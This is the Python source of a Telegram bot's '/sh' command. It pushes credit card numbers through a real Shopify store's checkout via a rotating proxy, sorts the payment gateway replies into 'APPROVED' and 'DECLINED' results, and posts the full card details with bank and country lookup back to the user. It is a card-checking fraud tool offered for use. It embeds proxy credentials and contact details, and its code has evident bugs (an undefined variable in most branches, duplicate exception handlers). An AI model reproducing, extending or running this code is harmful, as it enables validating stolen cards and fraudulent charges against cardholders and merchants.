import requests
import time
from utils.helpers import *
from utils.bot_config import *
from handlers.command_handlers import *

def shopify(cc, mes, ano, cvv, message):
    chat_id = message.chat.id
    session = requests.Session()
    session.proxies = {'https': 'http://yosuojza-rotate:h8wex4qzydhf@p.webshare.io:80'}

    try:
        payload_1 = {'id': '43651399155890'}
        req1 = session.post(url='https://www.manitobah.com/cart/add.js', data=payload_1)
        time.sleep(1)

        req3 = session.post(url='https://www.manitobah.com/checkout/')
        checkout_url = req3.url
        authenticity_token = get_random_string(86)  # Asegúrate de definir esta función
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
        }

        payload_2 = f'_method=patch&authenticity_token={authenticity_token}&checkout%5Bemail%5D=lopesandres112%40gmail.com&...'
        req4 = session.post(url=checkout_url, headers=headers, data=payload_2)
        time.sleep(3)

        payload_3 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=Advanced+Shipping+Rules-flat-rate-0.00&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1302&checkout%5Bclient_details%5D%5Bbrowser_height%5D=953&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=0'
        req5 = session.post(url=checkout_url, headers=headers, data=payload_3)
        time.sleep(3)

        payload_4 = {
            "credit_card": {
                "number":f"{cc[0:4]} {cc[4:8]} {cc[8:12]} {cc[12:16]}",
                "name": "Sin Rol",
                "month": mes,
                "year": ano,
                "verification_value": cvv
        },
        "payment_session_scope": "https://www.manitobah.com"
            }
            
        req6 = session.post(url='https://deposit.us.shopifycs.com/sessions', json=payload_4)
        token = req6.json()
        id_ = token.get('id')
        bot.send_message(message.chat.id, "Comenzando...")
        for i in range(10):
            bot.edit_message_text(chat_id=message.chat.id,
                                  text=f"• VERIFICANDO CC: •｛i*10｝%",
                                  reply_markup=None,
                                  parse_mode="HTML"
                                  )
            time.sleep(1)
        print("</> ID SESSION:", id_)
            
        payload_5 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=payment_method&step=&s={id_}&checkout%5Bpayment_gateway%5D=71778074802&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bvault_phone%5D=%2B19542287072&checkout%5Btotal_price%5D=1999&checkout_submitted_request_url=https%3A%2F%2Fwww.manitobah.com%2F999802%2Fcheckouts%2Fb18bcd169ec759e53a22ca6b96714229%3Ffrom_processing_page%3D1%26validate%3Dtrue&checkout_submitted_page_id=49d93155-57C0-4C2C-FF80-315C0C8DB5E8&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1302&checkout%5Bclient_details%5D%5Bbrowser_height%5D=953&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=0'
        req7 = session.post(url=checkout_url, headers=headers, data=payload_5)
        time.sleep(5)
            
        processing_url = req7.url
        print("</> PROCESANDO URL:", processing_url)
        time.sleep(4)
            
        req8 = session.get(str(processing_url) + '?from_processing_page=1')
        time.sleep(4)

        resp = find_between(req8.text, 'notice__text">', '<')
        session.close()

        if '/thank_you' in req8.url or '/orders/' in req8.url or '/post_purchase' in req8.url:
                msg = "APPROVED CHARGE💲💲"
                respuesta = "Charged"
        elif '/3d_secure_2/' in req8.url:
                msg = "DECLINED 3D⚜️"
                respuesta = "3d_secure_2"
        elif "Security code was not matched by the processor" in resp:
                msg = "APPROVED💲"
                respuesta = "Security code mismatch"
        elif "Security codes does not match correct format (3-4 digits)" in resp:
                msg = "APPROVED💵"
                respuesta = "Invalid security code format"
        elif "CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number." in resp:
                msg = "APPROVED CCN💲"
                respuesta = "CVV2 mismatch"
        elif "Insufficient Funds" in resp:
                msg = "APPROVED💵💲"
                respuesta = resp
        elif "There was a problem processing the payment. Try refreshing this page or check your internet connection." in resp:
                msg = "DECLINED❌"
                respuesta = "General Decline by shopify"
        else:
                msg = "DECLINED❌"
                respuesta = "Credit Card Do not exist"
                ccvip = f"{cc}|{mes}|{ano}|{cvv}"    
        ccs = message.text[len('/sh '):]
        x = get_bin_info(ccs[:6])
        user = message.from_user
        sent_message = bot.reply_to(message, "Recopilando información...")

        bot.edit_message_text(f"""
       • SHOPIFY | CHARGE 1$ •
------------------------------------------
<b> Información de la Tarjeta</b> <code>{ccvip}</code>
<b> • Resultado:</b> <code>{msg}</code>
<b> Respuesta:</b> <code>{respuesta}</code>
<b> Banco:</b> <code>{x.get("bank_name")}</code>
<b> Tipo:</b> <code>{x.get("type")}</code> - <code>{x.get("level")}</code> - <code>{x.get("brand")}</code>
<b>🟢 País:</b> <code>{x.get("country")} {x.get("flag")}</code> 
-------------------INFO------------------- 
• Créditos: {get_tokens(chat_id)}
• BY: @{user.username}
• ID: <code>{user.id}</code>""", chat_id=message.chat.id, message_id=sent_message.message_id, parse_mode='HTML')
    except Exception as e:
           print(f"Error inesperado: {e}")
           msg = "DECLINED"
           ccvip = f"{cc}|{mes}|{ano}|{cvv}"
           respuesta = f"Error inesperado: {e}"
           bot.send_message(message.chat.id, text=f"""
<b>🟢 Información de la Tarjeta</b> <code>{ccvip}</code>
<b>🟢 Resultado:</b> <code>{msg}</code>
<b>🟢 Respuesta:</b> <code>{respuesta}</code>
            """, parse_mode='HTML')

    except Exception as e:
        print(f"Error inesperado: {e}")
        bot.send_message(message.chat.id, text=f"Se produjo un error: {e}")

    finally:
        session.close()
